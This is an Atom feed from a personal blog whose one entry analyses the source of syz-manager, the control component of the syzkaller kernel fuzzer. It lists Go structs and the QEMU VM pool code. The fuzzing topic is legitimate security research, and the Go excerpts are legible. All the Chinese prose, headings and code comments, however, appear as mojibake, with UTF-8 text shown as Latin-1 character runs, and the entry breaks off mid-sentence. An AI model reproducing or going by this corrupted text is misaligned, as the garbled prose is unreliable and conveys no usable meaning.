<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>arttnba3&#39;s blog</title>
  
  <subtitle>arttnba3çš„ç§˜å¯†å°å±‹</subtitle>
  <link href="http://blog.arttnba3.cn/atom.xml" rel="self"/>
  
  <link href="http://blog.arttnba3.cn/"/>
  <updated>2023-03-01T20:40:20.334Z</updated>
  <id>http://blog.arttnba3.cn/</id>
  
  <author>
    <name>arttnba3</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>ã€FUZZ.0x02ã€‘syzkaller - IIï¼šsyz-manageræºç åˆ†æ</title>
    <link href="http://blog.arttnba3.cn/2023/03/02/FUZZ-0X02-SYZKALLER-II_SOURCE_SYZMANAGER/"/>
    <id>http://blog.arttnba3.cn/2023/03/02/FUZZ-0X02-SYZKALLER-II_SOURCE_SYZMANAGER/</id>
    <published>2023-03-01T20:33:58.000Z</published>
    <updated>2023-03-01T20:40:20.334Z</updated>
    
    <content type="html"><![CDATA[<p>å®å°±æ˜¯ğŸ‘´ã® Manager ğŸ</p><span id="more"></span><h1>0x00.ä¸€åˆ‡å¼€å§‹ä¹‹å‰</h1><p>syzkaller æ˜¯ä¸€ä¸ªéå¸¸ç»å…¸çš„ kernel fuzzerï¼Œè™½ç„¶ç¬”è€…ä¹‹å‰æ›¾ç»ç”¨è¿‡ï¼ˆä¸è¿‡ç¬”è€…å¤ªèœäº†å•¥éƒ½æ²¡æŒ–å‡ºæ¥ï¼‰ä¹Ÿæ›¾ç²—ç•¥è¯»è¿‡æºç ï¼Œä½†æ˜¯æ²¡æœ‰å¤ªè¿‡äºä»”ç»†åˆ†æå°±æŠ›åœ¨è„‘åäº†ï¼ˆæ‚²ï¼‰</p><p>ä¸ºäº†æ·±å…¥å­¦ä¹  fuzzing theoryï¼Œç¬”è€…å†³å®šå…ˆä»è¿™ä¸ªå…¸ä¸­å…¸çš„ syzkaller æºç è¿›è¡Œåˆ†æå­¦ä¹  ï¼šï¼‰</p><h2 id="PRE-å·¥ä½œåŸç†">PRE.å·¥ä½œåŸç†</h2><p>å¯¹äº syzkaller çš„æ¶æ„ï¼Œå®˜æ–¹ç»™å‡ºäº†è¿™æ ·çš„ä¸€å¼  Overview</p><p><img src="https://i.loli.net/2021/11/11/LxNvdhpEX2sBjYc.png" alt="image.png"></p><p>syzkaller æ•´ä½“ä¸Šä¸ºä¸€ä¸ª<strong>åŒæœºè°ƒè¯•ç»“æ„</strong>ï¼šç”±ä¸€å°æœºå™¨è´Ÿè´£ç®¡æ§æ•´ä¸ª fuzzing æµç¨‹ï¼ˆæœ¬æ–‡ç§°ä¸º <code>Host</code>ï¼‰ï¼Œåœ¨å¦ä¸€å°æœºå™¨ä¸Šè¿›è¡Œ fuzzingï¼ˆæœ¬æ–‡ç§°ä¸º <code>Guest</code>ï¼‰ï¼ŒGuest é€šå¸¸ä¸ºè™šæ‹Ÿæœºï¼Œä»è€Œèƒ½è®© Host æ›´å¥½åœ°ç®¡æ§æ•´ä¸ªæµç¨‹</p><p>syzkaller åˆ†ä¸ºä¸‰å¤§ç»„ä»¶ï¼š</p><ul><li><p>ä½äº Hostï¼š</p><ul><li><code>syz-manager</code> ï¼šsyzkaller çš„æ§åˆ¶ä¸­æ¢ï¼Œå…¶ä¼šå¯åŠ¨å¤šä¸ª VM å®ä¾‹ï¼ˆå¦‚å›¾æ‰€ç¤ºçš„ä¸€ä¸ªé»„è‰²å¡ç‰‡å°±æ˜¯ä¸€ä¸ªå®ä¾‹ï¼‰å¹¶è¿›è¡Œç›‘è§†ï¼ŒåŒæ—¶é€šè¿‡ RPC æ¥å¯åŠ¨ <code>syz-fuzzer</code></li></ul></li><li><p>ä½äº Guestï¼š</p><ul><li><code>syz-fuzzer</code> ï¼šè´Ÿè´£å¼•å¯¼æ•´ä¸ª fuzz çš„è¿‡ç¨‹ï¼š<ul><li>ç”Ÿæˆ input</li><li>å¯åŠ¨ <code>syz-executor</code> è¿›ç¨‹è¿›è¡Œ fuzz</li><li>ä»è¢« fuzz çš„ kernel çš„ <code>/sys/kernel/debug/kcov</code> è·å¾—è¦†ç›–ï¼ˆcoverageï¼‰çš„ç›¸å…³ä¿¡æ¯</li><li>é€šè¿‡ RPC å°†æ–°çš„è¦†ç›–å›é€åˆ° <code>syz-manager</code></li></ul></li><li><code>syz-executor</code>ï¼šè´Ÿè´£<strong>æ‰§è¡Œå•ä¸ªè¾“å…¥</strong>â€”â€”ä» <code>syz-fuzzer</code> å¤„æ¥å— input å¹¶æ‰§è¡Œï¼Œæœ€åå›é€ç»“æœ</li></ul></li></ul><p><code>syz-manager</code> ä¸º syzkaller çš„æ§åˆ¶ä¸­æ¢ï¼Œå…¶ä¼šå¯åŠ¨å¤šä¸ª VM å®ä¾‹å¹¶è¿›è¡Œç›‘è§†ï¼ŒåŒæ—¶é€šè¿‡ RPC æ¥å¯åŠ¨ <code>syz-fuzzer</code>ï¼Œæˆ‘ä»¬é€šå¸¸å¯åŠ¨ fuzzing æ—¶ä¾¿æ˜¯ä»¥ <code>syz-manager</code> ä½œä¸ºç¨‹åºå¯åŠ¨çš„å…¥å£ç‚¹ï¼Œå› æ­¤ç¬”è€…ä¹Ÿå…ˆä»æ­¤å¤„å¼€å§‹åˆ†æ</p><h1>0x01. åŸºæœ¬ç»“æ„ä½“</h1><p>ç›¸æ¯”äºç›´æ¥å¼€å§‹åˆ†ææºç ï¼Œç¬”è€…è®¤ä¸ºæœ‰å¿…è¦åœ¨æ­¤ä¹‹å‰å…ˆåˆ—å‡ºä¸€äº›åŸºæœ¬çš„ç»“æ„ä½“ï¼Œä½ ä¹Ÿå¯ä»¥æŠŠè¿™ä¸€èŠ‚å½“æˆä¸€ä¸ªè¡¨æ¥æŸ¥ ï¼šï¼‰</p><h2 id="VM-ç®¡æ§ç›¸å…³">VM ç®¡æ§ç›¸å…³</h2><p>Host éœ€è¦å»æ„ŸçŸ¥ä¸ç®¡æ§ Guest VMsï¼Œå› è€Œåœ¨ <code>syz-manager</code> å½“ä¸­æœ‰ç€ä¸€å¥—ç›¸åº”çš„è¡¨ç¤ºä¸ç®¡ç† Guest VM çš„ç»“æ„ä½“</p><h3 id="1-Instanceï¼šVM-å®ä¾‹">1. Instanceï¼šVM å®ä¾‹</h3><p><code>syz-manager</code> ä¸­çš„ VM å®é™…ä¸Šæ˜¯ä½¿ç”¨ä¸€ä¸ªåä¸º <code>Instance</code> çš„ç»“æ„ä½“æ¥è¡¨ç¤ºçš„ï¼Œå®šä¹‰äº <code>vm/vm.go</code> ä¸­ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> Instance <span class="hljs-keyword">struct</span> &#123;<br>impl     vmimpl.Instance<br>workdir  <span class="hljs-type">string</span><br>timeouts targets.Timeouts<br>index    <span class="hljs-type">int</span><br>onClose  <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span><br>&#125;<br></code></pre></td></tr></table></figure><p>ç±»ä¼¼åœ°ï¼Œå…¶éœ€è¦å®ç° <code>Interface</code> æ¥å£ï¼Œå®šä¹‰äº <code>vm/vmimpl/vmimpl.go</code> ä¸­ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// Instance è¡¨ç¤ºä¸€ä¸ªå•ç‹¬çš„ VM.</span><br><span class="hljs-keyword">type</span> Instance <span class="hljs-keyword">interface</span> &#123;<br><span class="hljs-comment">// Copy å¤åˆ¶ä¸€ä¸ª hostSrc æ–‡ä»¶åˆ° VM ä¸­å¹¶è¿”å› VM ä¸­çš„æ–‡ä»¶å.</span><br>Copy(hostSrc <span class="hljs-type">string</span>) (<span class="hljs-type">string</span>, <span class="hljs-type">error</span>)<br><br><span class="hljs-comment">// Forward è®¾ç½®ä»è™šæ‹Ÿæœºå†…åˆ°ä¸»æœºä¸Šç»™å®š tcp ç«¯å£çš„è½¬å‘ï¼Œ</span><br><span class="hljs-comment">// å¹¶è¿”å›è¦åœ¨è™šæ‹Ÿæœºä¸­ä½¿ç”¨çš„åœ°å€.</span><br>Forward(port <span class="hljs-type">int</span>) (<span class="hljs-type">string</span>, <span class="hljs-type">error</span>)<br><br><span class="hljs-comment">// Run åœ¨è™šæ‹Ÿæœºå†…æ‰§è¡Œå‘½ä»¤ (ç±»ä¼¼ ssh cmd).</span><br><span class="hljs-comment">// outc æ¥å—æ··åˆäº†å‘½ä»¤è¡Œä¸å†…æ ¸æ§åˆ¶å°çš„è¾“å‡º.</span><br><span class="hljs-comment">// errc æ¥å—å‘½ä»¤ç­‰å¾…è¿”å› error æˆ– vmimpl.ErrTimeout.</span><br><span class="hljs-comment">// Command åœ¨ timeout ååœæ­¢. åœ¨ stop chan ä¸Šå‘é€å¯ä»¥ç”¨ä»¥æ›´æ—©å°†å…¶ç»ˆæ­¢.</span><br>Run(timeout time.Duration, stop &lt;-<span class="hljs-keyword">chan</span> <span class="hljs-type">bool</span>, command <span class="hljs-type">string</span>) (outc &lt;-<span class="hljs-keyword">chan</span> []<span class="hljs-type">byte</span>, errc &lt;-<span class="hljs-keyword">chan</span> <span class="hljs-type">error</span>, err <span class="hljs-type">error</span>)<br><br><span class="hljs-comment">// Diagnose ä» VM ä¸Šæ£€ç´¢é¢å¤–çš„è°ƒè¯•ä¿¡æ¯</span><br><span class="hljs-comment">// (ä¾‹å¦‚é€šè¿‡å‘é€ä¸€äº› sys-rq&#x27;s æˆ– SIGABORT&#x27;ing ä¸€ä¸ª Go ç¨‹åº).</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// é€‰æ‹©æ€§åœ°ç›´æ¥è¿”å› (ä¸€äº›æˆ–æ‰€æœ‰) ä¿¡æ¯. è‹¥ wait == true,</span><br><span class="hljs-comment">// è°ƒç”¨è€…å¿…é¡»ç­‰å¾… VM ç›´æ¥è¾“å‡ºä¿¡æ¯åˆ°å…¶æ—¥å¿—.</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// rep æè¿°äº† Diagnose è¢«è°ƒç”¨çš„åŸå› .</span><br>Diagnose(rep *report.Report) (diagnosis []<span class="hljs-type">byte</span>, wait <span class="hljs-type">bool</span>)<br><br><span class="hljs-comment">// Close åœæ­¢å¹¶é”€æ¯ VM.</span><br>Close()<br>&#125;<br></code></pre></td></tr></table></figure><ul><li><code>Copy()</code>ï¼šå°†ä¸€ä¸ªæ¥è‡ªå®¿ä¸»æœºçš„æ–‡ä»¶æ‹·è´è‡³è™šæ‹Ÿæœºä¸­ï¼Œè¿”å›è™šæ‹Ÿæœºä¸­çš„æ–‡ä»¶å.</li><li><code>Forward()</code>ï¼šè®¾ç½®ä»è™šæ‹Ÿæœºå†…åˆ°ä¸»æœºä¸Šç»™å®š tcp ç«¯å£çš„è½¬å‘ï¼Œå¹¶è¿”å›è¦åœ¨è™šæ‹Ÿæœºä¸­ä½¿ç”¨çš„åœ°å€</li><li><code>Run()</code>ï¼šåœ¨è™šæ‹Ÿæœºå†…æ‰§è¡Œå‘½ä»¤</li><li><code>Diagnose()</code>ï¼šåœ¨è™šæ‹Ÿæœºä¸Šæ£€ç´¢é¢å¤–çš„è°ƒè¯•ä¿¡æ¯</li><li><code>Close()</code>ï¼šåœæ­¢å¹¶é”€æ¯è™šæ‹Ÿæœº</li></ul><p>éœ€è¦æ³¨æ„çš„æ˜¯<strong>ä¸åŒç±»å‹çš„ Guest VM æ‰€å®ç°çš„ Interface æ¥å£æ˜¯ä¸åŒçš„</strong></p><blockquote><p>ä»¥ QEMU ä¸ºä¾‹ï¼Œå…¶å®ç°ä¸»è¦ä½äº <code>vm/qemu/qemu.go</code> ä¸­</p></blockquote><h3 id="2-Poolï¼šVM-æ± ">2.Poolï¼šVM æ± </h3><p>ç±»ä¼¼äºçº¿ç¨‹æ± çš„æ¦‚å¿µï¼Œåœ¨ <code>syz-manager</code> ä¸­ä½¿ç”¨ä¸€ä¸ª <strong>VM æ± </strong> â€”â€” <code>Pool</code> ç»“æ„ä½“æ¥ç®¡æ§ Guest VMï¼Œè¯¥ç»“æ„ä½“å®šä¹‰äº <code>vm/vm.go</code> ä¸­ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> Pool <span class="hljs-keyword">struct</span> &#123;<br>impl        vmimpl.Pool<br>workdir     <span class="hljs-type">string</span><br>template    <span class="hljs-type">string</span><br>timeouts    targets.Timeouts<br>activeCount <span class="hljs-type">int32</span><br>&#125;<br></code></pre></td></tr></table></figure><p>è¯¥ç»“æ„ä½“å®ç°äº† <code>Pool</code> æ¥å£ï¼Œå®šä¹‰äº <code>vm/vmimpl/vmimpl.go</code> ä¸­ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// Pool è¡¨ç¤ºäº†ä¸€ç»„ç‰¹å®šç±»å‹çš„æµ‹è¯•æœºå™¨ (è™šæ‹Ÿæœº, ç‰©ç†è®¾å¤‡, etc).</span><br><span class="hljs-keyword">type</span> Pool <span class="hljs-keyword">interface</span> &#123;<br><span class="hljs-comment">// Count è¿”å›æ± ä¸­æ‰€æœ‰ VM çš„æ•°é‡.</span><br>Count() <span class="hljs-type">int</span><br><br><span class="hljs-comment">// Create åˆ›å»ºå¹¶å¯åŠ¨ä¸€ä¸ªæ–°çš„ VM å®ä¾‹.</span><br>Create(workdir <span class="hljs-type">string</span>, index <span class="hljs-type">int</span>) (Instance, <span class="hljs-type">error</span>)<br>&#125;<br></code></pre></td></tr></table></figure><ul><li><code>Count()</code>ï¼šè¿”å›æ± ä¸­æ‰€æœ‰ VM çš„æ•°é‡</li><li><code>Create()</code>ï¼š<strong>æ–°å»ºå¹¶å¯åŠ¨ä¸€ä¸ª VMå®ä¾‹</strong>ï¼Œè¿”å›æ–°å»ºçš„å®ä¾‹å¯¹è±¡</li></ul><h4 id="QEMU-VM-æµ…æ">QEMU VM æµ…æ</h4><p>ä»¥ QEMU ä¸ºä¾‹çš„ Pool æ¥å£å®ç°å¦‚ä¸‹ï¼Œå¯¹äº <code>Count()</code> è€Œè¨€ä¼šç›´æ¥è¿”å›é…ç½®æ–‡ä»¶ä¸­çš„è®¡æ•°ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(pool *Pool)</span></span> Count() <span class="hljs-type">int</span> &#123;<br><span class="hljs-keyword">return</span> pool.cfg.Count<br>&#125;<br></code></pre></td></tr></table></figure><p><code>Create()</code> åˆ™ä¼šé¦–å…ˆæ£€æŸ¥æ–‡ä»¶ç³»ç»Ÿé•œåƒæ˜¯å¦ä¸º <code>9p</code> æ ¼å¼ï¼Œè‹¥æ˜¯åˆ™ä¼šç”Ÿæˆä¸€ä¸ª ssh key å­˜æ”¾åˆ° <code>key</code> æ–‡ä»¶ä¸­å¹¶ç”Ÿæˆä¸€ä¸ª <code>init.sh</code> æ–‡ä»¶ï¼›æ¥ä¸‹æ¥å°±æ˜¯è°ƒç”¨ <code>ctor()</code> å‡½æ•°åˆ›å»ºè™šæ‹Ÿæœºï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(pool *Pool)</span></span> Create(workdir <span class="hljs-type">string</span>, index <span class="hljs-type">int</span>) (vmimpl.Instance, <span class="hljs-type">error</span>) &#123;<br>sshkey := pool.env.SSHKey<br>sshuser := pool.env.SSHUser<br><span class="hljs-keyword">if</span> pool.env.Image == <span class="hljs-string">&quot;9p&quot;</span> &#123;<br>sshkey = filepath.Join(workdir, <span class="hljs-string">&quot;key&quot;</span>)<br>sshuser = <span class="hljs-string">&quot;root&quot;</span><br><span class="hljs-keyword">if</span> _, err := osutil.RunCmd(<span class="hljs-number">10</span>*time.Minute, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;ssh-keygen&quot;</span>, <span class="hljs-string">&quot;-t&quot;</span>, <span class="hljs-string">&quot;rsa&quot;</span>, <span class="hljs-string">&quot;-b&quot;</span>, <span class="hljs-string">&quot;2048&quot;</span>,<br><span class="hljs-string">&quot;-N&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;-C&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;-f&quot;</span>, sshkey); err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, err<br>&#125;<br>initFile := filepath.Join(workdir, <span class="hljs-string">&quot;init.sh&quot;</span>)<br><span class="hljs-keyword">if</span> err := osutil.WriteExecFile(initFile, []<span class="hljs-type">byte</span>(strings.Replace(initScript, <span class="hljs-string">&quot;&#123;&#123;KEY&#125;&#125;&quot;</span>, sshkey, <span class="hljs-number">-1</span>))); err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, fmt.Errorf(<span class="hljs-string">&quot;failed to create init file: %v&quot;</span>, err)<br>&#125;<br>&#125;<br><br><span class="hljs-keyword">for</span> i := <span class="hljs-number">0</span>; ; i++ &#123;<br>inst, err := pool.ctor(workdir, sshkey, sshuser, index)<br><span class="hljs-keyword">if</span> err == <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> inst, <span class="hljs-literal">nil</span><br>&#125;<br><span class="hljs-comment">// Older qemu prints &quot;could&quot;, newer -- &quot;Could&quot;.</span><br><span class="hljs-keyword">if</span> i &lt; <span class="hljs-number">1000</span> &amp;&amp; strings.Contains(err.Error(), <span class="hljs-string">&quot;ould not set up host forwarding rule&quot;</span>) &#123;<br><span class="hljs-keyword">continue</span><br>&#125;<br><span class="hljs-keyword">if</span> i &lt; <span class="hljs-number">1000</span> &amp;&amp; strings.Contains(err.Error(), <span class="hljs-string">&quot;Device or resource busy&quot;</span>) &#123;<br><span class="hljs-keyword">continue</span><br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, err<br>&#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><code>ctor()</code> çš„å®ç°æ¯”è¾ƒç®€å•ï¼Œä¸»è¦å°±æ˜¯åˆ›å»ºä¸€ä¸ªå¸¦ç€ ssh key åŠä¸€äº›é…ç½®ä¿¡æ¯ä¸ä¸€ä¸ª channel çš„ <code>instance</code> å®ä¾‹ï¼Œåˆå§‹åŒ–å®ä¾‹å†…çš„ç®¡é“å¹¶è°ƒç”¨ <code>boot()</code> å‡½æ•°è¿›è¡Œæ­£å¼çš„åˆ›å»ºï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(pool *Pool)</span></span> ctor(workdir, sshkey, sshuser <span class="hljs-type">string</span>, index <span class="hljs-type">int</span>) (vmimpl.Instance, <span class="hljs-type">error</span>) &#123;<br>inst := &amp;instance&#123;<br>index:      index,<br>cfg:        pool.cfg,<br>target:     pool.target,<br>archConfig: pool.archConfig,<br>version:    pool.version,<br>image:      pool.env.Image,<br>debug:      pool.env.Debug,<br>os:         pool.env.OS,<br>timeouts:   pool.env.Timeouts,<br>workdir:    workdir,<br>sshkey:     sshkey,<br>sshuser:    sshuser,<br>diagnose:   <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-type">bool</span>, <span class="hljs-number">1</span>),<br>&#125;<br><span class="hljs-keyword">if</span> st, err := os.Stat(inst.image); err != <span class="hljs-literal">nil</span> &amp;&amp; st.Size() == <span class="hljs-number">0</span> &#123;<br><span class="hljs-comment">// Some kernels may not need an image, however caller may still</span><br><span class="hljs-comment">// want to pass us a fake empty image because the rest of syzkaller</span><br><span class="hljs-comment">// assumes that an image is mandatory. So if the image is empty, we ignore it.</span><br>inst.image = <span class="hljs-string">&quot;&quot;</span><br>&#125;<br>closeInst := inst<br><span class="hljs-keyword">defer</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">if</span> closeInst != <span class="hljs-literal">nil</span> &#123;<br>closeInst.Close()<br>&#125;<br>&#125;()<br><br><span class="hljs-keyword">var</span> err <span class="hljs-type">error</span><br>inst.rpipe, inst.wpipe, err = osutil.LongPipe()<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, err<br>&#125;<br><br><span class="hljs-keyword">if</span> err := inst.boot(); err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, err<br>&#125;<br><br>closeInst = <span class="hljs-literal">nil</span><br><span class="hljs-keyword">return</span> inst, <span class="hljs-literal">nil</span><br>&#125;<br></code></pre></td></tr></table></figure><p><code>boot()</code> å‡½æ•°ä¸»è¦å°±æ˜¯å„ç§å‚æ•°åˆ¤æ–­ï¼Œä¹‹å<strong>æŠŠ QEMU èµ·äº†ä»¥å ssh è¿ä¸Šå»</strong>ï¼Œè¿™é‡Œå°±ä¸æ‘˜æŠ„ä»£ç äº†ï¼šï¼‰</p><h3 id="3-Envï¼šå•ä¸ª-VM-Pool-çš„ç¯å¢ƒå˜é‡">3. Envï¼šå•ä¸ª  VM Pool çš„ç¯å¢ƒå˜é‡</h3><p><code>Env</code> ç»“æ„ä½“ä¸ºç”¨äºä¸€ä¸ª VM Pool çš„ç¯å¢ƒå˜é‡ï¼Œå®šä¹‰äº <code>vm/vmimpl/vmimpl.go</code> ä¸­ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// Env åŒ…å«äº†ç”¨äº VM æ± çš„å…¨å±€å¸¸é‡å‚æ•°.</span><br><span class="hljs-keyword">type</span> Env <span class="hljs-keyword">struct</span> &#123;<br><span class="hljs-comment">// ç‹¬ç‰¹çš„åå­—</span><br><span class="hljs-comment">// è‹¥å‡ ä¸ª Pool å…±äº«äº†å…¨å±€å‘½åç©ºé—´åˆ™å¯è¢«ç”¨äº VM name çš„å†²çªè§£å†³</span><br>Name      <span class="hljs-type">string</span><br>OS        <span class="hljs-type">string</span> <span class="hljs-comment">// ç›®æ ‡ OS</span><br>Arch      <span class="hljs-type">string</span> <span class="hljs-comment">// ç›®æ ‡ arch</span><br>Workdir   <span class="hljs-type">string</span><br>Image     <span class="hljs-type">string</span><br>SSHKey    <span class="hljs-type">string</span><br>SSHUser   <span class="hljs-type">string</span><br>Timeouts  targets.Timeouts<br>Debug     <span class="hljs-type">bool</span><br>Config    []<span class="hljs-type">byte</span> <span class="hljs-comment">// json-åºåˆ—åŒ–çš„ VM-ç±»å‹-ç‰¹å®šé…ç½®</span><br>KernelSrc <span class="hljs-type">string</span><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="4-Typeï¼šVM-ç±»å‹">4. Typeï¼šVM ç±»å‹</h3><p>ä¸€ä¸ª VM Pool ä¸­åªèƒ½æœ‰ä¸€ç§ç±»å‹çš„ VMï¼Œå› è€Œä¸åŒç±»å‹çš„ VM çš„ Pool åº”å½“è¦æœ‰ä¸åŒçš„æ„é€ å‡½æ•°ï¼Œåœ¨ <code>syz-manager</code> ä¸­ä½¿ç”¨ <code>Type</code> ç»“æ„ä½“è¡¨ç¤ºä¸€ç§ VM çš„ç±»å‹ä¿¡æ¯ï¼Œå®šä¹‰äº <code>vm/vmimpl/vmimpl.go</code> ä¸­ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> Type <span class="hljs-keyword">struct</span> &#123;<br>Ctor       ctorFunc<br>Overcommit <span class="hljs-type">bool</span><br>&#125;<br><br><span class="hljs-keyword">type</span> ctorFunc <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(env *Env)</span></span> (Pool, <span class="hljs-type">error</span>)<br></code></pre></td></tr></table></figure><p><code>ctorFunc</code> ä¸ºæ„é€ å‡½æ•°ç±»å‹ï¼Œå…¶æ¥å—ä¸€ä¸ª <code>Env</code> ç±»å‹çš„ç»“æ„ä½“æŒ‡é’ˆï¼ˆå‚¨å­˜äº†å…¨å±€çš„ä¸€äº›åŸºæœ¬ä¿¡æ¯ï¼‰ï¼Œå¹¶è¿”å›ä¸€ä¸ª VM Pool å®ä¾‹</p><p>ç”±ä¸€ä¸ªå…¨å±€çš„ <code>stringâ†’Type</code> æ˜ å°„è¡¨å­˜å‚¨äº†ä¸åŒç±»å‹ VM çš„ä¿¡æ¯ï¼Œåœ¨æ­£å¼å¯åŠ¨ä¹‹å‰ç¨‹åºä¼šé€šè¿‡ <code>Register()</code> å‡½æ•°å°†ä¸åŒç±»å‹çš„ VM ä¿¡æ¯æ³¨å†Œåˆ°è¯¥è¡¨ä¸­ï¼Œå®šä¹‰äº <code>vm/vmimpl/vmimpl.go</code> ä¸­ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// Register åœ¨åŒ…ä¸­æ³¨å†Œä¸€ä¸ªæ–°çš„ VM ç±»å‹.</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Register</span><span class="hljs-params">(typ <span class="hljs-type">string</span>, ctor ctorFunc, allowsOvercommit <span class="hljs-type">bool</span>)</span></span> &#123;<br>Types[typ] = Type&#123;<br>Ctor:       ctor,<br>Overcommit: allowsOvercommit,<br>&#125;<br>&#125;<br><br><span class="hljs-comment">//...</span><br><br><span class="hljs-keyword">var</span>(<br>    <span class="hljs-comment">//...</span><br>Types = <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]Type)<br></code></pre></td></tr></table></figure><p>ä»¥ <code>QEMU</code> 